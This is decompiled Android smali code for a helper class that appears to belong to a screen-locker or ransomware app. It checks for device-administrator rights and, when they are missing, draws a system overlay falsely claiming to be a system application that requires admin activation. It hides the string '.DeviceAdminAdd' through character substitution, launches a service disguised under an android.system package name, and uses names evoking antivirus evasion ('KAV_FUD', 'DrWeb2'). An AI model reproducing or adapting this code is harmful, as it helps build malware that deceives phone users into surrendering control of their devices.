.class public Lcom/xprot/zProt$Helper;
.super Landroid/os/AsyncTask;
.source "zProt.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/xprot/zProt;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "Helper"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field PS:Landroid/view/WindowManager$LayoutParams;

.field VW:Landroid/view/View;

.field WM:Landroid/view/WindowManager;

.field final synthetic this$0:Lcom/xprot/zProt;


# direct methods
.method public constructor <init>(Lcom/xprot/zProt;)V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 158
    iput-object p1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 160
    iput-object v0, p0, Lcom/xprot/zProt$Helper;->WM:Landroid/view/WindowManager;

    .line 161
    iput-object v0, p0, Lcom/xprot/zProt$Helper;->VW:Landroid/view/View;

    .line 162
    iput-object v0, p0, Lcom/xprot/zProt$Helper;->PS:Landroid/view/WindowManager$LayoutParams;

    return-void
.end method

.method private AdminRequest()V
    .locals 3

    .prologue
    .line 393
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v1}, Lcom/xprot/zProt;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/xprot/devA;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 394
    .local v0, "GA":Landroid/content/Intent;
    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 395
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 396
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v1, v0}, Lcom/xprot/zProt;->startActivity(Landroid/content/Intent;)V

    .line 397
    return-void
.end method

.method private DrWeb2(Landroid/content/ComponentName;)Z
    .locals 4
    .param p1, "t_Init"    # Landroid/content/ComponentName;

    .prologue
    .line 373
    const-string v1, ".!Z2OceAdminAdd"

    .line 374
    const-string v2, "!"

    const-string v3, "D"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 375
    const-string v2, "Z"

    const-string v3, "e"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 376
    const-string v2, "2"

    const-string v3, "v"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 377
    const-string v2, "O"

    const-string v3, "i"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 379
    .local v0, "KAV_FUD":Ljava/lang/String;
    invoke-virtual {p1}, Landroid/content/ComponentName;->getShortClassName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    return v1
.end method

.method private RemoveView(Landroid/view/WindowManager;Landroid/view/View;)V
    .locals 1
    .param p1, "winMan"    # Landroid/view/WindowManager;
    .param p2, "findViewById"    # Landroid/view/View;

    .prologue
    .line 385
    :try_start_0
    invoke-interface {p1, p2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 390
    :goto_0
    return-void

    .line 386
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method static synthetic access$2(Lcom/xprot/zProt$Helper;)V
    .locals 0

    .prologue
    .line 392
    invoke-direct {p0}, Lcom/xprot/zProt$Helper;->AdminRequest()V

    return-void
.end method

.method static synthetic access$3(Lcom/xprot/zProt$Helper;Landroid/content/ComponentName;)Z
    .locals 1

    .prologue
    .line 372
    invoke-direct {p0, p1}, Lcom/xprot/zProt$Helper;->DrWeb2(Landroid/content/ComponentName;)Z

    move-result v0

    return v0
.end method

.method static synthetic access$4(Lcom/xprot/zProt$Helper;Landroid/view/WindowManager;Landroid/view/View;)V
    .locals 0

    .prologue
    .line 382
    invoke-direct {p0, p1, p2}, Lcom/xprot/zProt$Helper;->RemoveView(Landroid/view/WindowManager;Landroid/view/View;)V

    return-void
.end method

.method static synthetic access$5(Lcom/xprot/zProt$Helper;Landroid/os/Handler;Ljava/lang/Runnable;I)V
    .locals 0

    .prologue
    .line 366
    invoke-direct {p0, p1, p2, p3}, Lcom/xprot/zProt$Helper;->postRun(Landroid/os/Handler;Ljava/lang/Runnable;I)V

    return-void
.end method

.method static synthetic access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;
    .locals 1

    .prologue
    .line 158
    iget-object v0, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    return-object v0
.end method

.method private postRun(Landroid/os/Handler;Ljava/lang/Runnable;I)V
    .locals 2
    .param p1, "hookz"    # Landroid/os/Handler;
    .param p2, "rZa"    # Ljava/lang/Runnable;
    .param p3, "i"    # I

    .prologue
    .line 368
    int-to-long v0, p3

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 370
    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/xprot/zProt$Helper;->doInBackground([Ljava/lang/Void;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/Void;)Ljava/lang/String;
    .locals 14
    .param p1, "arg0"    # [Ljava/lang/Void;

    .prologue
    const/4 v13, 0x0

    const/4 v1, -0x2

    .line 167
    iget-object v2, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    const-string v3, "device_policy"

    invoke-virtual {v2, v3}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/admin/DevicePolicyManager;

    .line 169
    .local v6, "AzkOAOnv":Landroid/app/admin/DevicePolicyManager;
    iget-object v2, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    const-string v3, "window"

    invoke-virtual {v2, v3}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/view/WindowManager;

    .line 171
    .local v11, "WinMan":Landroid/view/WindowManager;
    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v3}, Lcom/xprot/zProt;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/xprot/zLock;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v6, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v12

    .line 174
    .local v12, "active":Z
    if-eqz v12, :cond_0

    .line 175
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    new-instance v2, Landroid/content/Intent;

    iget-object v3, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v3}, Lcom/xprot/zProt;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/android/system/LockSvc;

    invoke-direct {v2, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v2}, Lcom/xprot/zProt;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 176
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    const/4 v2, 0x1

    iput-boolean v2, v1, Lcom/xprot/zProt;->B:Z

    .line 177
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v1}, Lcom/xprot/zProt;->stopSelf()V

    move-object v1, v13

    .line 351
    :goto_0
    return-object v1

    .line 182
    :cond_0
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    .line 184
    const/16 v3, 0x7da

    .line 185
    const/16 v4, 0x400

    .line 186
    const/4 v5, -0x3

    move v2, v1

    .line 182
    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 189
    .local v0, "DevAdShowParams":Landroid/view/WindowManager$LayoutParams;
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    const-string v2, "layout_inflater"

    invoke-virtual {v1, v2}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/LayoutInflater;

    .line 190
    .local v8, "Infalter":Landroid/view/LayoutInflater;
    const v1, 0x7f030005

    invoke-virtual {v8, v1, v13}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v7

    .line 193
    .local v7, "DevAdShow":Landroid/view/View;
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v1}, Lcom/xprot/zProt;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "ZBLK"

    const-string v3, "id"

    iget-object v4, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v4}, Lcom/xprot/zProt;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v7, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v10

    .line 192
    check-cast v10, Landroid/widget/Button;

    .line 196
    .local v10, "Tmp":Landroid/widget/Button;
    iget-object v1, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v1}, Lcom/xprot/zProt;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "promo"

    const-string v3, "id"

    iget-object v4, p0, Lcom/xprot/zProt$Helper;->this$0:Lcom/xprot/zProt;

    invoke-virtual {v4}, Lcom/xprot/zProt;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v7, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v9

    .line 195
    check-cast v9, Landroid/widget/TextView;

    .line 198
    .local v9, "Promo":Landroid/widget/TextView;
    const-string v1, "\nAction required.\n\nThis is system application.\n\n   You must activate device administator.   \n"

    invoke-virtual {v9, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 200
    iput-object v11, p0, Lcom/xprot/zProt$Helper;->WM:Landroid/view/WindowManager;

    .line 201
    iput-object v7, p0, Lcom/xprot/zProt$Helper;->VW:Landroid/view/View;

    .line 202
    iput-object v0, p0, Lcom/xprot/zProt$Helper;->PS:Landroid/view/WindowManager$LayoutParams;

    .line 207
    new-instance v1, Lcom/xprot/zProt$Helper$1;

    invoke-direct {v1, p0, v7, v9, v10}, Lcom/xprot/zProt$Helper$1;-><init>(Lcom/xprot/zProt$Helper;Landroid/view/View;Landroid/widget/TextView;Landroid/widget/Button;)V

    invoke-virtual {v10, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 348
    const-string v1, "na"

    goto :goto_0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/xprot/zProt$Helper;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 3
    .param p1, "r"    # Ljava/lang/String;

    .prologue
    .line 355
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 357
    if-eqz p1, :cond_0

    const-string v0, "na"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 359
    iget-object v0, p0, Lcom/xprot/zProt$Helper;->WM:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/xprot/zProt$Helper;->VW:Landroid/view/View;

    iget-object v2, p0, Lcom/xprot/zProt$Helper;->PS:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 364
    :cond_0
    return-void
.end method
